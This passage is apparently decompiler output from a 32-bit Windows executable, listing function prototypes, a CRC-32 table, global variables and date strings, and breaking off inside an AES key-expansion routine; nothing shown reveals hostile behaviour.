int32_t function_410297(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4102d3(int64_t * a1, int64_t * a2, int64_t * a3, int32_t a4);
int32_t function_4104eb(int32_t a1, int32_t a2);
int32_t function_4105b0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_410611(float80_t a1, int32_t a2, int32_t a3);
int32_t function_41067b(int864_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4107a6(int32_t a1, int32_t * a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
float80_t function_4108b1(float80_t a1, int32_t a2);
int32_t function_4108c7(int32_t a1);
int32_t function_4108fb(int32_t a1, int32_t a2, float80_t a3, float80_t a4, int32_t a5, int32_t a6);
int32_t function_4109c9(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_410ba9(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_410bcc(int32_t * a1, int32_t * a2, int32_t a3, int32_t a4, int32_t * a5, int32_t * a6, int32_t a7);
int32_t function_410ebd(int32_t a1);
int32_t function_410eec(int32_t a1, int32_t a2, float80_t a3, float80_t a4, float80_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_410f8e(float80_t a1, int32_t a2, int32_t * a3, int32_t result, int32_t a5, int32_t a6);
float80_t function_411062(float80_t result, int32_t a2, int32_t a3);
int32_t function_411091(float80_t a1, int32_t a2, int32_t a3);
int32_t function_4110ef(float80_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
bool function_411193(int32_t ProcessorFeature);
int32_t function_4111a0(int32_t a1, uint32_t a2);
int32_t function_4111f0(int32_t * a1);
int32_t function_4112b0(int32_t a1);
int32_t function_4112e3(int32_t a1, int32_t a2);
int32_t function_411320(uint32_t a1, uint32_t a2, uint32_t a3, int32_t a4);
int32_t function_4113c0(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_411409(void);
int32_t function_411420(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_411460(int32_t result);
int32_t function_411490(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_411570(void);
int32_t function_411590(void);
int32_t function_4115a6(void);
int32_t function_4115c0(void);
int32_t function_4115e0(void);
int32_t function_4116a0(int32_t a1, unsigned char a2);
int32_t function_4117e0(int32_t a1, unsigned char a2);
int32_t function_411910(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4119ba(int32_t a1);
int32_t function_4119d5(int32_t a1);
int32_t function_4119f0(void);


// Detected cryptographic pattern: CRC_32_IEEE_802_3_poly_0x04C11DB7 (32-bit, little endian)
int32_t CRC_32_IEEE_802_3_poly_0x04C11DB7_at_417028[256] = {0, 0x4c11db7, 0x9823b6e, 0xd4326d9, 0x130476dc, 0x17c56b6b, 0x1a864db2, 0x1e475005, 0x2608edb8, 0x22c9f00f, 0x2f8ad6d6, 0x2b4bcb61, 0x350c9b64, 0x31cd86d3, 0x3c8ea00a, 0x384fbdbd, 0x4c11db70, 0x48d0c6c7, 0x4593e01e, 0x4152fda9, 0x5f15adac, 0x5bd4b01b, 0x569796c2, 0x52568b75, 0x6a1936c8, 0x6ed82b7f, 0x639b0da6, 0x675a1011, 0x791d4014, 0x7ddc5da3, 0x709f7b7a, 0x745e66cd, -0x67dc4920, -0x631d54a9, -0x6e5e7272, -0x6a9f6fc7, -0x74d83fc4, -0x70192275, -0x7d5a04ae, -0x799b191b, -0x41d4a4a8, -0x4515b911, -0x48569fca, -0x4c97827f, -0x52d0d27c, -0x5611cfcd, -0x5b52e916, -0x5f93f4a3, -0x2bcd9270, -0x2f0c8fd9, -0x224fa902, -0x268eb4b7, -0x38c9e4b4, -0x3c08f905, -0x314bdfde, -0x358ac26b, -0xdc57fd8, -0x9046261, -0x44744ba, -0x86590f, -0x1ec1090c, -0x1a0014bd, -0x17433266, -0x13822fd3, 0x34867077, 0x30476dc0, 0x3d044b19, 0x39c556ae, 0x278206ab, 0x23431b1c, 0x2e003dc5, 0x2ac12072, 0x128e9dcf, 0x164f8078, 0x1b0ca6a1, 0x1fcdbb16, 0x18aeb13, 0x54bf6a4, 0x808d07d, 0xcc9cdca, 0x7897ab07, 0x7c56b6b0, 0x71159069, 0x75d48dde, 0x6b93dddb, 0x6f52c06c, 0x6211e6b5, 0x66d0fb02, 0x5e9f46bf, 0x5a5e5b08, 0x571d7dd1, 0x53dc6066, 0x4d9b3063, 0x495a2dd4, 0x44190b0d, 0x40d816ba, -0x535a3969, -0x579b24e0, -0x5ad80207, -0x5e191fb2, -0x405e4fb5, -0x449f5204, -0x49dc74db, -0x4d1d696e, -0x7552d4d1, -0x7193c968, -0x7cd0efbf, -0x7811f20a, -0x6656a20d, -0x6297bfbc, -0x6fd49963, -0x6b1584d6, -0x1f4be219, -0x1b8affb0, -0x16c9d977, -0x1208c4c2, -0xc4f94c5, -0x88e8974, -0x5cdafab, -0x10cb21e, -0x39430fa1, -0x3d821218, -0x30c134cf, -0x3400297a, -0x2a47797d, -0x2e8664cc, -0x23c54213, -0x27045fa6, 0x690ce0ee, 0x6dcdfd59, 0x608edb80, 0x644fc637, 0x7a089632, 0x7ec98b85, 0x738aad5c, 0x774bb0eb, 0x4f040d56, 0x4bc510e1, 0x46863638, 0x42472b8f, 0x5c007b8a, 0x58c1663d, 0x558240e4, 0x51435d53, 0x251d3b9e, 0x21dc2629, 0x2c9f00f0, 0x285e1d47, 0x36194d42, 0x32d850f5, 0x3f9b762c, 0x3b5a6b9b, 0x315d626, 0x7d4cb91, 0xa97ed48, 0xe56f0ff, 0x1011a0fa, 0x14d0bd4d, 0x19939b94, 0x1d528623, -0xed0a9f2, -0xa11b447, -0x75292a0, -0x3938f29, -0x1dd4df2e, -0x1915c29b, -0x1456e444, -0x1097f9f5, -0x28d8444a, -0x2c1959ff, -0x215a7f28, -0x259b6291, -0x3bdc3296, -0x3f1d2f23, -0x325e09fc, -0x369f144d, -0x42c17282, -0x46006f37, -0x4b4349f0, -0x4f825459, -0x51c5045e, -0x550419eb, -0x58473f34, -0x5c862285, -0x64c99f3a, -0x6008828f, -0x6d4ba458, -0x698ab9e1, -0x77cde9e6, -0x730cf453, -0x7e4fd28c, -0x7a8ecf3d, 0x5d8a9099, 0x594b8d2e, 0x5408abf7, 0x50c9b640, 0x4e8ee645, 0x4a4ffbf2, 0x470cdd2b, 0x43cdc09c, 0x7b827d21, 0x7f436096, 0x7200464f, 0x76c15bf8, 0x68860bfd, 0x6c47164a, 0x61043093, 0x65c52d24, 0x119b4be9, 0x155a565e, 0x18197087, 0x1cd86d30, 0x29f3d35, 0x65e2082, 0xb1d065b, 0xfdc1bec, 0x3793a651, 0x3352bbe6, 0x3e119d3f, 0x3ad08088, 0x2497d08d, 0x2056cd3a, 0x2d15ebe3, 0x29d4f654, -0x3a56d987, -0x3e97c432, -0x33d4e2e9, -0x3715ff60, -0x2952af5b, -0x2d93b2ee, -0x20d09435, -0x24118984, -0x1c5e343f, -0x189f298a, -0x15dc0f51, -0x111d12e8, -0xf5a42e3, -0xb9b5f56, -0x6d8798d, -0x219643c, -0x764702f7, -0x72861f42, -0x7fc53999, -0x7b042430, -0x6543742b, -0x6182699e, -0x6cc14f45, -0x680052f4, -0x504fef4f, -0x548ef2fa, -0x59cdd421, -0x5d0cc998, -0x434b9993, -0x478a8426, -0x4ac9a2fd, -0x4e08bf4c}; // 0x417028
int32_t g1 = -0x74f3ba75; // 0x406d33
int32_t g2 = 0x5d5b5e5f; // 0x408629
int32_t g3 = 0x5b5e5f5d; // 0x408669
int32_t g4 = 0; // 0x4121f8
int32_t g5 = 0; // 0x412204
int32_t g6 = 0; // 0x412208
int32_t g7 = 0; // 0x412224
int32_t g8 = 0; // 0x412230
int32_t g9 = 0; // 0x412240
int32_t g10 = 0; // 0x412244
int32_t g11 = 0; // 0x412248
int32_t g12 = 0x40634b; // 0x412308
int32_t g13 = 0x40634b; // 0x412328
int32_t g14 = 0x40634b; // 0x412344
int32_t g15 = 0x40692e; // 0x412368
int32_t g16 = 0x40634b; // 0x412378
int32_t g17 = 0x40634b; // 0x412384
int32_t g18 = -0x23ed5979; // 0x4123dc
int32_t g19 = 0x44aca674; // 0x41241c
int32_t g20 = 0x4590f811; // 0x4124ac
int32_t g21 = 0x674b6698; // 0x4124bc
char * g22 = "csm\xe0\x01"; // 0x41256c
int32_t g23 = 0x40634b; // 0x412590
int32_t g24; // 0x4125a8
int32_t g25 = 0; // 0x412660
int32_t g26 = 0; // 0x412674
int32_t g27 = 0; // 0x412684
int32_t g28 = 0; // 0x412698
struct _RTL_CRITICAL_SECTION * g29 = (struct _RTL_CRITICAL_SECTION *)1; // 0x4126ac
int32_t g30 = 0x4087ab; // 0x412e54
int32_t g31 = -0x3ffffffb; // 0x412e58
int32_t g32 = 0x40a4b1; // 0x412f20
int32_t g33 = 1; // 0x412f98
int32_t g34 = 22; // 0x412f9c
int32_t g35 = 0x200020; // 0x413200
char * g36[43] = {
    "Sun",
    "Mon",
    "Tue",
    "Wed",
    "Thu",
    "Fri",
    "Sat",
    "Sunday",
    "Monday",
    "Tuesday",
    "Wednesday",
    "Thursday",
    "Friday",
    "Saturday",
    "Jan",
    "Feb",
    "Mar",
    "Apr",
    "May",
    "Jun",
    "Jul",
    "Aug",
    "Sep",
    "Oct",
    "Nov",
    "Dec",
    "January",
    "February",
    "March",
    "April",
    "May",
    "June",
    "July",
    "August",
    "September",
    "October",
    "November",
    "December",
    "AM",
    "PM",
    "MM/dd/yy",
    "dddd, MMMM dd, yyyy",
    "HH:mm:ss"
}; // 0x413a60
int32_t g37; // 0x413bc8
int32_t g38 = 2; // 0x41407c
int32_t g39 = 2; // 0x414084
int32_t g40 = 2; // 0x41408c
int32_t g41 = 2; // 0x414094
int32_t g42 = 0; // 0x41409c
struct _RTL_CRITICAL_SECTION * g43 = (struct _RTL_CRITICAL_SECTION *)8; // 0x4140b8
int32_t g44 = 4; // 0x4140c0
int32_t g45 = 4; // 0x4140d8
int32_t g46 = 1; // 0x414140
int32_t g47 = 0; // 0x414a68
int32_t g49 = 66; // 0x41525c
int128_t g50; // 0x4161e0
int128_t g51; // 0x4161f0
int128_t g52; // 0x416200
int128_t g53; // 0x416210
int128_t g54; // 0x416230
int128_t g55; // 0x416240
int128_t g56; // 0x416250
int128_t g57; // 0x416260
int128_t g58; // 0x416270
int128_t * g59 = NULL; // 0x416280
int128_t g60; // 0x4162a0
int128_t g61; // 0x4162b0
int128_t g62; // 0x4162f0
int128_t g63; // 0x416300
int128_t g64; // 0x416310
int128_t g65; // 0x416320
char * g66 = "\b\x04\b\b\b\x04\b\b"; // 0x4163be
int128_t * g67 = NULL; // 0x416450
int128_t * g68 = NULL; // 0x416860
int32_t g69 = 20; // 0x416d08
char (*g70)[4] = "exp"; // 0x416d0c
char * g71 = "\x8d\x01\x02\x04\b\x10 @\x80\x1b\x36"; // 0x417018
int32_t g72; // 0x417438
int32_t g73; // 0x418e90
int32_t g74; // 0x418ee0
int32_t g75 = 46; // 0x4192fc
int32_t g76 = -2; // 0x4240a8
int32_t g77 = -2; // 0x4240c8
int32_t g78 = 0; // 0x4240e4
int32_t g79 = 0; // 0x424138
int32_t g80 = 0; // 0x424190
int32_t g81 = -2; // 0x4241d0
int32_t g82 = -2; // 0x4241f0
int32_t g83 = -2; // 0x424218
int32_t g84 = -2; // 0x424298
int32_t g85 = 0; // 0x4242b4
int32_t g86 = -2; // 0x4242f0
int32_t g87 = -2; // 0x424310
int32_t g88 = -28; // 0x424330
int32_t g89 = -2; // 0x424358
int32_t g90 = -2; // 0x424378
int32_t g91 = -2; // 0x424398
int32_t g92 = -28; // 0x4243b8
int32_t g93 = -2; // 0x4243d8
int32_t g94 = -2; // 0x4243f8
int32_t g95 = -2; // 0x424420
int32_t g96 = -2; // 0x424440
int32_t g97 = -2; // 0x424460
int32_t g98 = -2; // 0x424480
int32_t g99 = -2; // 0x4244a0
int32_t g100 = -2; // 0x4244c0
int32_t g101 = -2; // 0x4244e0
int32_t g102 = -28; // 0x424500
int32_t g103 = -2; // 0x424520
int32_t g104 = -2; // 0x424540
int32_t g105 = -2; // 0x424560
int32_t g106 = -2; // 0x424580
int32_t g107 = -2; // 0x4245a0
int32_t g108 = -2; // 0x4245c0
int32_t g109 = -2; // 0x4245e0
int32_t g110 = -2; // 0x424600
int32_t g111 = -0x80000000; // 0x426000
int32_t g112 = -0x44bf19b2; // 0x426008
int32_t g113 = 0x44bf19b1; // 0x42600c
int32_t g114 = 1; // 0x426010
int32_t g115 = 1; // 0x426020
char g116 = -1; // 0x426030
char g117 = 2; // 0x426050
int32_t g118 = 12; // 0x426060
int32_t g119 = 8; // 0x426064
int32_t g120 = 0; // 0x426068
int32_t g121 = -1; // 0x426110
int32_t g124 = 67; // 0x4261d8
char * g125 = "\x01\x02\x04\b\xa4\x03"; // 0x4261dc
int32_t g126 = 932; // 0x4261e0
int16_t * g127 = (int16_t *)-0x7d867da0; // 0x4261e4
char * g128 = "\xa6\xdf"; // 0x4261f0
int32_t g129 = 0; // 0x4262d0
int32_t g130 = 0; // 0x4263d8
int32_t g131 = 0; // 0x4264d8
int32_t g132 = 0x4264d800; // 0x4266f7
int32_t g134; // 0x426708
char g139 = -2; // 0x426758
int32_t g140 = 1; // 0x426760
int32_t g141 = -2; // 0x426764
int32_t g142; // 0x426780
int32_t g143; // 0x4267c4
int32_t g144 = -0xb707862; // 0x4267e8
int16_t * g145 = NULL; // 0x4268e8
int32_t g146 = 0; // 0x4268f8
int32_t g147 = 7; // 0x4268fc
struct _RTL_CRITICAL_SECTION * g149 = NULL; // 0x4269f8
int32_t g150 = 0; // 0x426a10
int32_t g151 = 0; // 0x426a14
int32_t g152 = 0; // 0x426a18
int32_t g153 = 0; // 0x426a1c
int32_t g154 = 0; // 0x426a20
int32_t g155 = 0; // 0x426a2c
char g156 = 0; // 0x426a38
int32_t g157 = 0; // 0x426a3c
int32_t g158 = 0; // 0x426a40
char g159 = 0; // 0x426a44
int32_t g160 = 0; // 0x426a48
int32_t g161 = 0; // 0x426a4c
int32_t g162 = 0; // 0x426a50
int32_t g163 = 0; // 0x426a54
int32_t g164 = 0; // 0x426a60
int32_t g165 = 0; // 0x426a68
int32_t g166 = 0; // 0x426a6c
int32_t g167 = 0; // 0x426a74
int32_t g168 = 0; // 0x426a78
int32_t g169 = 0; // 0x426a7c
int32_t g170 = 0; // 0x426ab8
int32_t g171 = 0; // 0x426b64
int32_t g172 = 0; // 0x426b68
int32_t g173 = 0; // 0x426b6c
int32_t g174 = 0; // 0x426b70
int32_t g175 = 0; // 0x426b78
int32_t g176 = 0; // 0x426b7c
int32_t g177 = 0; // 0x426d84
int32_t g178 = 0; // 0x426d94
int32_t g179 = 0; // 0x426dac
int64_t g180 = 0; // 0x426dc4
int16_t * g181 = NULL; // 0x426dc8
int32_t g182 = 0; // 0x426dd4
int32_t g183 = 0; // 0x426de8
int32_t g184 = 0; // 0x426e28
int32_t g185 = 0; // 0x426e2c
int32_t g186 = 0; // 0x426e30
int32_t g187 = 0; // 0x426e34
int32_t g188 = 0; // 0x426e38
char g189 = 0; // 0x426e3c
char * g190; // 0x426e40
int32_t g191 = 0; // 0x426f48
int32_t g192 = 0; // 0x426f50
int32_t g193 = 0; // 0x426f54
int32_t g194 = 0; // 0x426f58
int32_t g195 = 0; // 0x426f64
int32_t g196 = 0; // 0x426f70
int32_t g197 = 0; // 0x426f74
int32_t g198 = 0; // 0x426f78
int32_t g199 = 0; // 0x426f7c
int32_t g200 = 0; // 0x426f80
int32_t g201 = 0; // 0x426f84
int32_t g202 = 0; // 0x426f88
int32_t g203 = 0; // 0x426f8c
int32_t g204 = 0; // 0x426f90
int32_t g205 = 0; // 0x426f94
int32_t g206 = 0; // 0x426f98
int32_t g207 = 0; // 0x426fa0
int32_t g208 = 0; // 0x427190
int32_t g209 = 0; // 0x4271a0
struct _RTL_CRITICAL_SECTION * g210 = NULL; // 0x4271a8
int64_t g211 = 0; // 0x4272e0
int32_t g212 = 0; // 0x4272e8
char * g213; // 0x427338
int32_t g214 = 0; // 0x4273b8
int32_t g215 = 0; // 0x4273bc
int32_t g216 = 0; // 0x4273c0
int32_t g217 = 0; // 0x4273c4
int32_t g218 = 0; // 0x4273c8
int32_t g219 = 0; // 0x4273d4
char g220 = 0; // 0x4273d8
int32_t g221 = 0; // 0x4273dc
int32_t g222 = 0; // 0x4273e0
int32_t g223 = 0; // 0x4273e4
char * g224; // 0x4273e8
int32_t g225 = 0; // 0x4273ec
char * g226; // 0x4273f0
int32_t g227 = 0; // 0x4273f4
int32_t g228 = 0; // 0x4273f8
int32_t g229 = 0; // 0x4273fc
int32_t g230 = 0; // 0x427400
int32_t g231 = 0; // 0x427404
int32_t g232 = 0; // 0x427408
int32_t g233 = 0; // 0x42740c
int32_t g234 = 0; // 0x427410
int32_t g235 = 0; // 0x427414
int32_t g236 = 0; // 0x427418
int32_t g237 = 0; // 0x42741c
int32_t g238 = 0; // 0x427424
int32_t g239 = 0; // 0x427428
int32_t g240 = 0; // 0x42742c
int32_t g241 = 0; // 0x427430
int32_t g242 = 0; // 0x427434
int16_t * g243 = NULL; // 0x427438
int32_t g244 = 0; // 0x42743c
int32_t g245 = 0; // 0x427440
int32_t g246 = 0; // 0x427444
int32_t g247 = 0; // 0x427448
int32_t g248 = 0; // 0x42744c
int32_t g249 = 0; // 0x427450
int32_t g250 = 0; // 0x427454
int32_t g251 = 0; // 0x427458
int32_t g252 = 0; // 0x42745c
int32_t g253 = 0; // 0x427460
int32_t g254 = 0; // 0x427468
int32_t g255 = 0; // 0x427470
int32_t g256 = 0; // 0x427474
int32_t g257 = 0; // 0x427478
int32_t g258 = 0; // 0x42747c
int32_t g259 = 0; // 0x427480
int32_t g260;
int32_t g261;
int32_t g262;
int32_t g263;
int32_t g264;
int32_t g265;
int32_t g266;
int32_t * g48 = &g47; // 0x415258
int32_t * g122 = &g35; // 0x426118
int32_t * g123 = &g131; // 0x4261d4
int32_t * g133 = &g131; // 0x4266f8
int32_t * g135 = &g233; // 0x426710
int32_t * g136 = &g233; // 0x42672c
int32_t * g137 = &g234; // 0x42673c
int32_t * g138 = &g234; // 0x426754
int32_t * g148 = &g15; // 0x4269d8

// ------------------------ Functions -------------------------

// Address range: 0x401000 - 0x40100c
int32_t function_401000(void) {
    // 0x401000
    return function_406059(0x4119f0);
}

// Address range: 0x401010 - 0x4011bd
// Used cryptographic patterns:
//  - AES_Rijndael_S___ARIA_S1 (8-bit, little endian)
int32_t function_401010(void) {
    // 0x401010
    int32_t v1; // 0x401010
    int32_t v2; // 0x401010
    *(char *)v2 = *(char *)&v1;
    *(char *)(v2 + 1) = *(char *)(v1 + 1);
    *(char *)(v2 + 2) = *(char *)(v1 + 2);
    *(char *)(v2 + 3) = *(char *)(v1 + 3);
    *(char *)(v2 + 4) = *(char *)(v1 + 4);
    *(char *)(v2 + 5) = *(char *)(v1 + 5);
    *(char *)(v2 + 6) = *(char *)(v1 + 6);
    *(char *)(v2 + 7) = *(char *)(v1 + 7);
    *(char *)(v2 + 8) = *(char *)(v1 + 8);
    *(char *)(v2 + 9) = *(char *)(v1 + 9);
    *(char *)(v2 + 10) = *(char *)(v1 + 10);
    *(char *)(v2 + 11) = *(char *)(v1 + 11);
    *(char *)(v2 + 12) = *(char *)(v1 + 12);
    *(char *)(v2 + 13) = *(char *)(v1 + 13);
    *(char *)(v2 + 14) = *(char *)(v1 + 14);
    *(char *)(v2 + 15) = *(char *)(v1 + 15);
    *(char *)(v2 + 16) = *(char *)(v1 + 16);
    *(char *)(v2 + 17) = *(char *)(v1 + 17);
    *(char *)(v2 + 18) = *(char *)(v1 + 18);
    *(char *)(v2 + 19) = *(char *)(v1 + 19);
    *(char *)(v2 + 20) = *(char *)(v1 + 20);
    *(char *)(v2 + 21) = *(char *)(v1 + 21);
    *(char *)(v2 + 22) = *(char *)(v1 + 22);
    *(char *)(v2 + 23) = *(char *)(v1 + 23);
    *(char *)(v2 + 24) = *(char *)(v1 + 24);
    *(char *)(v2 + 25) = *(char *)(v1 + 25);
    *(char *)(v2 + 26) = *(char *)(v1 + 26);
    *(char *)(v2 + 27) = *(char *)(v1 + 27);
    *(char *)(v2 + 28) = *(char *)(v1 + 28);
    int32_t v3 = v2 + 29; // 0x4010e2
    *(char *)v3 = *(char *)(v1 + 29);
    *(char *)(v2 + 30) = *(char *)(v1 + 30);
    char v4 = *(char *)(v1 + 31); // 0x4010f2
    *(char *)(v2 + 31) = v4;
    uint32_t v5 = 8;
    unsigned char v6 = *(char *)(v3 + 1); // 0x401100
    int32_t v7 = v4; // 0x401105
    int32_t v8 = v1; // 0x401105
    int32_t v9 = v8 & -0xff01 | 256 * v7; // 0x401105
    v1 = v9;
    int32_t v10 = (int32_t)*(char *)(v3 - 1); // 0x401108
    int32_t v11 = (int32_t)*(char *)v3; // 0x40110b
    int32_t v12 = v5 & 7; // 0x401113
    int32_t v13; // 0x401010
    int32_t v14; // 0x401010
    char v15; // 0x401010
    unsigned char v16; // 0x40111e
    char v17; // 0x401128
    unsigned char v18; // 0x401134
    char v19; // 0x401142
    char v20; // 0x401148
    int32_t v21; // 0x40114e
    int32_t v22; // 0x401158
    unsigned char v23; // 0x40115e
    unsigned char v24; // 0x401167
    char v25; // 0x401170
    unsigned char v26; // 0x40117c
    int32_t v27; // 0x40117c
    if (v12 != 0) {
        // 0x401153
        v13 = v9;
        v15 = v6;
        v14 = 256 * v11 | v10;
        if (v12 == 4) {
            // 0x401158
            v22 = v6;
            v23 = *(char *)(v10 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v24 = *(char *)(v11 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v25 = *(char *)(v22 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v26 = *(char *)(v7 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v27 = v8 & -0x10000 | v22 | 256 * (int32_t)v26;
            v1 = v27;
            v13 = v27;
            v15 = v25;
            v14 = 256 * (int32_t)v24 | (int32_t)v23;
        }
    } else {
        // 0x401118
        v16 = *(char *)((int32_t)v6 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
